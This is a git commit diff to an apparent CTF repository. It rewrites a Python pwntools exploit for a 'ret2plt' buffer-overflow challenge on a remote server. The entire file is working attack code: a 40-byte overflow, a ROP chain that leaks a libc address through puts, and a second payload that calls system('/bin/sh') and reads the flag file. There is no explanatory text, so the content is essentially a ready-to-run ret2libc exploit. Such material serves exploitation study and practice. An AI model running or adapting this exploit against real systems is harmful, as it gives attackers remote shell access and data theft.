9031e0391f9cccd367a3332a9f95ebefdc06c06d
shinmao <shinmaox2016@gmail.com>
2017-11-17 02:48:56 +0000

    add ret2plt and ret2lib payload

--- NTU-CTF-2017/ret2plt/ret2plt.py
+++ NTU-CTF-2017/ret2plt/ret2plt.py
@@ -1,25 +1,30 @@
 #!/usr/bin/env python
 from pwn import *
 
-r = remote("csie.ctf.tw",10131)
+elf = ELF('./ret2plt')
+lb = ELF('./libc.so.6')
+mao = remote('csie.ctf.tw',10131)
+
+pop_rdi_ret = 0x4006f3
+main = 0x400636
 
 context.arch = "amd64"
+payload = "A"*40
+payload += flat([pop_rdi_ret,elf.got['__libc_start_main'],elf.plt['puts'],main])
+mao.sendlineafter(":",payload)
 
-puts_got = 0x0000000000601018
-pop_rdi = 0x00000000004006f3
-puts_plt = 0x4004e0
-gets_plt = 0x400510
+mao.recvline()
+libc_base = u64(mao.recv(6).ljust(8,'\x00')) - lb.symbols['__libc_start_main']
 
-payload = "a"*40
-payload += flat([pop_rdi,puts_got,puts_plt,pop_rdi,puts_got,gets_plt,pop_rdi,puts_got+8,puts_plt])
-r.recvuntil(":")
-r.sendline(payload)
-r.recvuntil("\n")
-puts = u64(r.recvuntil("\n").strip().ljust(8,"\x00"))
-print hex(puts)
-libc = puts - 0x6f690
-system = libc + 0x45390
-payload = p64(system) + "/bin/sh\x00"
-r.sendline(payload)
-r.interactive()
+sh_off = 0x18cd17
+system = libc_base + lb.symbols['system']
+p = "A"*40
+p += flat([pop_rdi_ret,sh_off+libc_base,system])
+mao.sendlineafter(":",p)
+
+sleep(1)
+
+mao.sendline('cat /home/`whoami`/flag')
+
+mao.interactive()
 
